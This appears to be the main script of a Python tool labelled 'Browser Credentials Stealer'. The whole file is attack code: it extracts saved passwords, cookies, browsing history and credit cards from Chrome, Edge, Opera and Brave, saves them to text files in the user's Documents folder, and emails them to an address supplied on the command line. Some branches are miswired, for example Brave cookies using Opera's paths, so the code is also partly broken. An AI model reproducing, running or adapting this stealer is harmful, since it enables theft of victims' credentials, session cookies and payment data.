from content.source import *

if __name__ == '__main__':
    chrome = BROWSER(ch_localstate,ch_logindata,ch_cookie,ch_history,ch_creditcard)
    msedge = BROWSER(ms_localstate,ms_logindata,ms_cookie,ms_history,ms_creditcard)
    brave = BROWSER(br_localstate,br_logindata,br_cookie,br_history,br_creditcard)
    opera = BROWSER(op_localstate,op_logindata,op_cookie,op_history,op_creditcard)

    parser = argparse.ArgumentParser(description='Browser Credentials Stealer')
    parser.add_argument('-browser','--browser',type=str,metavar='',required=True,help='Browser Name: chrome/msedge/brave/opera')
    parser.add_argument('-get','--get',type=str,metavar='',required=False,help='Get:passwords/cookies/history/creditcards')
    parser.add_argument('-send','--send',type=str,metavar='',required=False,help='Select: passwords/cookies/history/creditcards')
    parser.add_argument('-to','--to',type=str,metavar='',required=False,help='Send: passwords/cookies/history/creditcards to email')
    args = parser.parse_args()

    if args.browser == 'chrome':
        if args.get == 'passwords':
            Banner('CHROME PASSWORD')
            chrome.PASS()
        elif args.get == 'cookies':
            Banner('CHROME COOKIES')
            chrome.COOKIE()
        elif args.get == 'history':
            Banner('CHROME HISTORY')
            chrome.HISTORY()
        elif args.get == 'creditcards':
            Banner('CHROME CARDS')
            chrome.CREDIT_CARD()
        elif args.send == 'passwords':
            Banner1('CHROME PASSWORD')
            chrome_send = BROWSER_SENDER(ch_localstate,ch_logindata,ch_cookie,ch_history,ch_creditcard,'chrome','CHROME PASSWORD',rf'C:\Users\{user}\Documents\chrome_pass.txt',args.to)
            chrome_send.PASS()
            chrome_send.SEND()
        elif args.send == 'cookies':
            Banner1('CHROME COOKIES')
            chrome_send = BROWSER_SENDER(ch_localstate,ch_logindata,ch_cookie,ch_history,ch_creditcard,'chrome','CHROME COOKIES',rf'C:\Users\{user}\Documents\chrome_cookies.txt',args.to)
            chrome_send.COOKIE()
            chrome_send.SEND()
        elif args.send == 'history':
            Banner1('CHROME History')
            chrome_send = BROWSER_SENDER(ch_localstate,ch_logindata,ch_cookie,ch_history,ch_creditcard,'chrome','CHROME HISTORY',rf'C:\Users\{user}\Documents\chrome_history.txt',args.to)
            chrome_send.HISTORY()
            chrome_send.SEND()
        elif args.send == 'creditcards':
            Banner1('CHROME CARDS')
            chrome_send = BROWSER_SENDER(ch_localstate,ch_logindata,ch_cookie,ch_history,ch_creditcard,'chrome','CHROME CARDS',rf'C:\Users\{user}\Documents\chrome_creditcards.txt',args.to)
            chrome_send.CREDIT_CARD()
            chrome_send.SEND()
    #-----------------------------
    elif args.browser == 'msedge' :
        if args.get == 'passwords':
            Banner('MSEDGE PASSWORDS')
            msedge.PASS()
        elif args.get == 'cookies':
            Banner('MSEDGE COOKIES')
            msedge.COOKIE()
        elif args.get == 'history':
            Banner('MSEDGE HISTROY')
            msedge.HISTORY()
        elif args.get == 'creditcards':
            Banner('MSEDGE CARDS')
            msedge.CREDIT_CARD()
        elif args.send == 'passwords':
            Banner1('MSEDGE PASSWORD')
            msedge_send = BROWSER_SENDER(ms_localstate,ms_logindata,ms_cookie,ms_history,ms_creditcard,'msedge','MSEDGE PASSWORD',rf'C:\Users\{user}\Documents\msedge_pass.txt',args.to)
            msedge_send.PASS()
            msedge_send.SEND()
        elif args.send == 'cookies':
            Banner1('MSEDGE COOKIES')
            msedge_send = BROWSER_SENDER(ms_localstate,ms_logindata,ms_cookie,ms_history,ms_creditcard,'msedge','MSEDGE COOKIES',rf'C:\Users\{user}\Documents\msedge_cookies.txt',args.to)
            msedge_send.COOKIE()
            msedge_send.SEND()
        elif args.send == 'history':
            Banner1('MSEDGE HISTORY')
            msedge_send = BROWSER_SENDER(ms_localstate,ms_logindata,ms_cookie,ms_history,ms_creditcard,'msedge','MSEDGE HISTORY',rf'C:\Users\{user}\Documents\msedge_history.txt',args.to)
            msedge_send.HISTORY()
            msedge_send.SEND()
        elif args.send == 'creditcards':
            Banner1('MSEDGE CARDS')
            msedge_send = BROWSER_SENDER(ms_localstate,ms_logindata,ms_cookie,ms_history,ms_creditcard,'msedge','MSEDGE CARDS',rf'C:\Users\{user}\Documents\msedge_creditcards.txt',args.to)
            msedge_send.CREDIT_CARD()
            msedge_send.SEND()
    #-----------------------------
    try:
        if args.browser == 'opera':
            if args.get == 'passwords':
                Banner('OPERA PASSWORDS')
                opera.PASS()
            elif args.get == 'cookies':
                Banner('OPERA COOKIES')
                opera.COOKIE()
            elif args.get == 'history':
                Banner('OPERA HISTROY')
                opera.HISTORY()
            elif args.get == 'creditcards':
                Banner('OPERA CARDS')
                opera.CREDIT_CARD()
            elif args.send == 'passwords':
                Banner1('OPERA PASSWORD')
                opera_send = BROWSER_SENDER(op_localstate,op_logindata,op_cookie,op_history,op_creditcard,'opera','OPERA PASSWORD',rf'C:\Users\{user}\Documents\opera_pass.txt',args.to)
                opera_send.PASS()
                opera_send.SEND()
            elif args.send == 'cookies':
                Banner1('OPERA COOKIES')
                opera_send = BROWSER_SENDER(op_localstate,op_logindata,op_cookie,op_history,op_creditcard,'opera','OPERA COOKIES',rf'C:\Users\{user}\Documents\opera_cookies.txt',args.to)
                opera_send.COOKIE()
                opera_send.SEND()
            elif args.send == 'history':
                Banner1('OPERA HISTORY')
                opera_send = BROWSER_SENDER(op_localstate,op_logindata,op_cookie,op_history,op_creditcard,'opera','OPERA HISTORY',rf'C:\Users\{user}\Documents\opera_history.txt',args.to)
                opera_send.HISTORY()
                opera_send.SEND()
            elif args.send == 'creditcards':
                Banner1('OPERA CARDS')
                opera_send = BROWSER_SENDER(op_localstate,op_logindata,op_cookie,op_history,op_creditcard,'opera','OPERA CARDS',rf'C:\Users\{user}\Documents\opera_creditcards.txt',args.to)
                opera_send.CREDIT_CARD()
                opera_send.SEND()
    except FileNotFoundError:
        print('Opera Not Found')
    #-----------------------------
    try:
        if args.browser == 'brave':
            if args.get == 'passwords':
                Banner('BRAVE PASSWORDS')
                brave.PASS()
            elif args.get == 'cookies':
                Banner('BRAVE COOKIES')
                brave.COOKIE()
            elif args.get == 'history':
                Banner('BRAVE HISTORY')
                brave.HISTORY()
            elif args.get == 'creditcards':
                Banner('BRAVE CARDS')
                brave.CREDIT_CARD()
            elif args.send == 'passwords':
                Banner1('BRAVE PASSWORD')
                brave_send = BROWSER_SENDER(br_localstate,br_logindata,br_cookie,br_history,br_creditcard,'brave','BRAVE PASSWORD',rf'C:\Users\{user}\Documents\brave_pass.txt',args.to)
                brave_send.PASS()
                brave_send.SEND()
            elif args.send == 'cookies':
                Banner1('BRAVE COOKIES')
                brave_send = BROWSER_SENDER(op_localstate,op_logindata,op_cookie,op_history,op_creditcard,'opera','OPERA COOKIES',rf'C:\Users\{user}\Documents\brave_cookies.txt',args.to)
                brave_send.COOKIE()
                brave_send.SEND()
            elif args.send == 'history':
                Banner1('BRAVE HISTORY')
                brave_send = BROWSER_SENDER(br_localstate,br_logindata,br_cookie,br_history,br_creditcard,'brave','BRAVE HISTORY',rf'C:\Users\{user}\Documents\brave_history.txt',args.to)
                brave_send.HISTORY()
                brave_send.SEND()
                Banner1('BRAVE CARDS')
                brave_send = BROWSER_SENDER(br_localstate,br_logindata,br_cookie,br_history,br_creditcard,'brave','BRAVE CARDS',rf'C:\Users\{user}\Documents\brave_creditcards.txt',args.to)
                brave_send.CREDIT_CARD()
                brave_send.SEND()
    except FileNotFoundError:
        print('Brave Not Found')